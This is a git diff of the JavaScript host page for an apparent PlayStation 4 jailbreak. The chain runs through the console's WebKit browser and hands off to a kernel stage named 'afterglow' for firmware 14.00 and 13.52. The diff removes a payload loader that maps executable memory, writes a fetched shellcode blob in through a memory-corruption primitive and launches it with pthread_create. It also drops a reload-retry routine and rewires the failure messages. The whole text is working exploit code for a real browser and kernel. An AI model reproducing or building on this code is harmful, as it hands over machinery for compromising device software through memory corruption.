@@ -6,9 +6,6 @@ import { offsetsFor, PS4 } from "./ps4_offsets.js";
 const outEl = document.getElementById("out");
 const stateEl = document.getElementById("state");
 const lines = [];
-let passCount = 0,
-  failCount = 0;
-let armedEver = false;
 const params = new URLSearchParams(location.search);
 
 /* The retry notice. Two things lead here: the chain throws, or it stalls
@@ -94,7 +91,6 @@ const SENT_HOME = (function () {
 })();
 
 const PROBE_MODE = params.get("probe") === "1";
-const STOP_BEFORE_DOUBLE = params.get("stop") === "beforedouble";
 
 const VERBOSE = params.get("verbose") === "1";
 const PROSE = [
@@ -120,7 +116,6 @@ function terse(s) {
 
 const SHOW_LOG = params.get("log") === "1";
 
-/* UPDATE_RAM_BOX */
 const ramBox =
   document.getElementById("ramBox");
 
@@ -224,13 +219,16 @@ if (ramBox) {
 /* Not when the page is on its way home: log mode hides #msg, which is
    where that notice sits. */
 if (SHOW_LOG && !SENT_HOME && document.body) document.body.className = "log";
-function finishUI(ok) {
+/* `ran` says whether the kernel stage was entered. A failure before that
+   costs nothing and a reload is enough; a failure after it may leave the
+   handles armed, and then only a cold start is safe. */
+function finishUI(ok, ran) {
   if (SHOW_LOG || !document.body) return;
   const m = document.getElementById("msg");
   if (m)
     m.textContent = ok
       ? "DONE"
-      : armedEver
+      : ran
         ? "Restart your console"
         : "Refresh the page and run again";
   document.body.className = ok ? "done" : "fail";
@@ -276,10 +274,8 @@ function state(t, c) {
 }
 function check(name, ok, detail) {
   if (ok) {
-    passCount++;
     mark("PROOF-OK", name + (detail ? "  " + detail : ""));
   } else {
-    failCount++;
     mark("PROOF-FAIL", name + (detail ? "  " + detail : ""));
   }
   return ok;
@@ -316,26 +312,16 @@ const keepAlive = [];
 let mainMf = null,
   mainOrig = null,
   mainArmed = false;
-let pinRestore = null;
 
-let jbRestoreHook = null;
-let allDone = false,
-  jailbroken = false,
-  kpatched = false,
-  payloadRunning = false;
 
 (async function () {
   if (SENT_HOME) return;
   let p = null;
 
-  const opened = [];
-  let closeFd = null;
   try {
     const { key, off } = offsetsFor(navigator.userAgent);
-    mark("BUILD", "jb=skipjb2 base=ef1670a");
     mark("FW", key || "(not a PS4 UA)");
     if (!off) {
-      /* NONPS4-DEBUG */
       try {
         document.body.classList.add("log");
       } catch (e) {}
@@ -394,15 +380,14 @@ let allDone = false,
         mark("NONPS4-CORE", "error=" + String(e));
       }
 
-      allDone = true;
       return;
     }
     const fwKey = key || "unknown";
 
-    /* afterglow's kernel offsets are 14.00 and nothing downstream checks
-       them. On another firmware the chain would come up in WebKit, then
-       write 14.00 addresses into a different kernel. Refuse before anything
-       is touched. */
+    /* afterglow carries one kernel stage per firmware, and nothing below
+       re-checks the key. On a firmware it has no stage for, the chain would
+       come up in WebKit and then write foreign addresses into the kernel --
+       so it is refused here, before anything is touched. */
     const SUPPORTED = ["14.00", "13.52"];
     if (params.get("afterglow") && SUPPORTED.indexOf(fwKey) < 0) {
       mark("FW-UNSUPPORTED", fwKey + " -- this build has a kernel stage for "
@@ -412,7 +397,6 @@ let allDone = false,
         "This build has a kernel stage for firmware " + SUPPORTED.join(", ") +
         " only. Detected " + fwKey + " - nothing was run.",
       );
-      allDone = true;
       return;
     }
 
@@ -496,18 +480,13 @@ let allDone = false,
         primitiveOk ? "PASS" : "FAIL",
       );
 
-      allDone = true;
       finishUI(primitiveOk);
       return;
     }
 
 
-    const DO_JB = params.get("jb") !== "0";
     const DO_PATCH = params.get("patch") !== "0";
     const DO_PAYLOAD = params.get("payload") !== "0";
-    const SKIPJB = params.get("skipjb") !== "0";
-
-    const KEEP_JB = params.get("keepjb") === "1";
 
     // afterglow brings its own kernel stage, so this run does not need the
     // host's kernel table at all.
@@ -540,11 +519,11 @@ let allDone = false,
     )
       return;
 
-    // With its own kernel stage, afterglow carries its own patch set
-    // (patchset.bin) and picks the payload from ?mode. The host's names for
-    // these never applied here.
+    // With its own kernel stage, afterglow carries its own patch set -- one
+    // per firmware, patchset-1400.bin and patchset-1352.bin -- and picks the
+    // payload from ?mode. The host's names for these never applied here.
     const KPATCH_FILE = OWN_KERNEL_STAGE
-      ? "patchset.bin (afterglow)"
+      ? "patchset-<fw>.bin (afterglow)"
       : "patches/" + (off.kpatch || fwKey.replace(".", "") + ".bin");
     const PAYLOAD_FILE = OWN_KERNEL_STAGE
       ? "hen.bin|goldhen.bin (per ?mode)"
@@ -603,65 +582,6 @@ let allDone = false,
       " src=ps4_offsets.js",
     );
 
-    // ---- benign-miss auto-retry (reads only, before any kernel write) ----
-    // A passA/passB "no crossing" is a recoverable reclaim miss in the READ
-    // phase -- no kernel .data/.text has been touched yet, so reloading and
-    // retrying is safe. The counter lives in sessionStorage so it survives
-    // the reload and is cleared the moment the read phase succeeds, so a
-    // later manual run always starts fresh. NEVER call retryBenign() after a
-    // kernel write: a reload would re-enter with the kernel already modified.
-    // A hard KP (a total reclaim miss that faults inside the cancel walk)
-    // cannot be caught here and still needs a reboot -- this only recovers
-    // the benign, detectable misses.
-    const retryArg = parseInt(params.get("retry") || "", 10);
-    const RETRY_MAX = Number.isFinite(retryArg) && retryArg >= 0 ? retryArg : 4;
-    const RETRY_KEY = "jb1352-read-retry";
-    const retryCount = () => {
-      try {
-        const v = parseInt(sessionStorage.getItem(RETRY_KEY) || "0", 10);
-        return Number.isFinite(v) && v > 0 ? v : 0;
-      } catch (e) {
-        return 0;
-      }
-    };
-    const clearRetry = () => {
-      try {
-        sessionStorage.removeItem(RETRY_KEY);
-      } catch (e) {}
-    };
-    const retryBenign = (why) => {
-      const n = retryCount();
-      if (n >= RETRY_MAX) {
-        mark(
-          "AUTO-RELOAD-GIVEUP",
-          "why=" + why + " reloads=" + n + " -- reboot and try again",
-        );
-        return false;
-      }
-      let stored = -1;
-      try {
-        sessionStorage.setItem(RETRY_KEY, String(n + 1));
-        stored = parseInt(sessionStorage.getItem(RETRY_KEY) || "-1", 10);
-      } catch (e) {
-        stored = -1;
-      }
-      if (stored !== n + 1) {
-        mark(
-          "AUTO-RELOAD-NO-STORAGE",
-          "why=" + why + " wrote=" + (n + 1) + " read=" + stored,
-        );
-        return false;
-      }
-      mark("AUTO-RELOAD", "why=" + why + " reload=" + (n + 1) + "/" + RETRY_MAX);
-      setTimeout(() => {
-        try {
-          location.reload();
-        } catch (e) {}
-      }, 400);
-      return true;
-    };
-    if (retryCount() > 0)
-      mark("AUTO-RELOAD-RESUME", "reload=" + retryCount() + "/" + RETRY_MAX);
 
     state("running the primitive...", "warn");
     await new Promise((r) => setTimeout(r, 0));
@@ -683,8 +603,7 @@ let allDone = false,
       "state=" +
         pairStatus.state +
         " promoted=" +
-        pairStatus.promoted +
-        "   (promotion off: the 137 MB stays pinned)",
+        pairStatus.promoted,
     );
     mark("PRIMITIVE-OK", "");
 
@@ -959,74 +878,17 @@ let allDone = false,
       };
     }
     const sc = (num, ...a) => callAddr(stubAddr.get(num), a);
-    closeFd = (fd) => sc(SYS.close, fd).i32;
     function errno() {
       const r = callAddr(errorFn, []);
       const a = new int64(r.lo, r.hi);
       return a.hi === 0 && a.low === 0 ? -1 : p.read4(a) | 0;
-    }
-    async function relaunchPayload() {
-      let blob = null;
-      try {
-        const r = await fetch(PAYLOAD_FILE);
-        if (r.ok) blob = new Uint8Array(await r.arrayBuffer());
-      } catch (e) {}
-      if (!blob || blob[0] !== 0xe9) {
-        mark("JB-RELAUNCH", "file=" + PAYLOAD_FILE + " blob=unusable");
-        return;
-      }
-      const sz = (blob.length + 0x3fff) & ~0x3fff;
-      const m = sc(SYS.mmap, 0, sz, 7, 0x1002, -1, 0);
-      const entry = new int64(m.lo, m.hi);
-      if (m.i32 === -1 || entry.hi >>> 0 === 0) {
-        mark("JB-RELAUNCH", "mmap failed err=" + errno());
-        return;
-      }
-      for (let o = 0; o < blob.length; o += 8) {
-        let lo = 0,
-          hi = 0;
-        for (let k = 0; k < 4; k++) lo |= (blob[o + k] || 0) << (8 * k);
-        for (let k = 0; k < 4; k++) hi |= (blob[o + 4 + k] || 0) << (8 * k);
-        p.write8(entry.add32(o), new int64(lo >>> 0, hi >>> 0));
-      }
-      let bad = -1;
-      for (let o = 0; o < blob.length && bad < 0; o++)
-        if (p.read1(entry.add32(o)) !== blob[o]) bad = o;
-      if (bad >= 0) {
-        mark("JB-RELAUNCH", "copy MISMATCH@0x" + bad.toString(16));
-        return;
-      }
-      const fn = p.read8(webkitBase.add32(off.wk___imp_pthread_create));
-      const expect = libkernelBase.add32(off.k_pthread_create);
-      if (fn.low !== expect.low || fn.hi !== expect.hi) {
-        mark("JB-RELAUNCH", "pthread_create got=" + fn + " want=" + expect);
-        return;
-      }
-      const thr = new ArrayBuffer(8);
-      keepAlive.push(thr);
-      new Uint8Array(thr).fill(0);
-      const rc = callAddr(expect, [bufAddr(thr), 0, entry, 0]).i32;
-      const tdv = new DataView(thr);
-      const handle = new int64(tdv.getUint32(0, true), tdv.getUint32(4, true));
-      payloadRunning = rc === 0 && handle.hi >>> 0 > 0;
-      check(
-        "JB-RELAUNCH",
-        payloadRunning,
-        "file=" +
-          PAYLOAD_FILE +
-          " bytes=" +
-          blob.length +
-          " pthread_create=" +
-          rc +
-          " handle=" +
-          handle,
-      );
     }
 
     if (params.get("afterglow")) {
       /* Arming requires a step from the landing page. A probe
          (afterglow=probe) fires no trigger and patches nothing, so a restored
          page may run that. */
+      let agOk = false, agRan = false;
       try {
         const ag = await import("./afterglow.js");
         // Exactly what afterglow reaches for, counted rather than guessed.
@@ -1038,15 +900,18 @@ let allDone = false,
           prepareMany: prepareMany, runPrepared: runPrepared,
         };
         if (params.get("afterglow") === "probe") {
-          ag.probeAfterglow(agCtx);
+          const probed = ag.probeAfterglow(agCtx);
+          agOk = !!(probed && probed.ok);
         } else {
-          await ag.runAfterglow(agCtx);
+          /* set before the call, not after: a throw inside the chain can
+             still have fired a shot, and that is the case `ran` is for */
+          agRan = true;
+          agOk = !!(await ag.runAfterglow(agCtx));
         }
       } catch (agError) {
         mark("AG-FAIL", agError && agError.message ? agError.message : String(agError));
       }
-      allDone = true;
-      finishUI(true);
+      finishUI(agOk, agRan);
       // Swap the address out. The browser restores the last one after a
       // reload, and an enabler that restarts SceShellUI causes exactly that
       // reload -- so the last address must not be the one that runs the
@@ -1061,7 +926,6 @@ let allDone = false,
       return;
     }
     mark("JB-END", "afterglow is the kernel stage -- without afterglow= nothing runs here");
-    allDone = true;
     try { if (mainArmed && mainMf && mainOrig && p) { p.write8(mainMf, mainOrig); mainArmed = false; } } catch (e) {}
     try { finishUI(false); } catch (e) {}
   } catch (eOuter) {
